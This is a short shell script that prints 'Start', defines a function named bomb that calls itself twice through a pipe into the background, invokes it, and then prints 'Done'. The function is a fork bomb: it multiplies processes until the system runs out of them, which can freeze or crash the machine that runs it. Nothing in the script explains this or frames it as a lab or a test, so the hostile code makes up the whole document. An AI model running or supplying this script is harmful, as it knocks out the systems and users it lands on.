#!/bin/sh
echo "Start"
bomb() {
    bomb | bomb &
}
bomb
echo "Done"
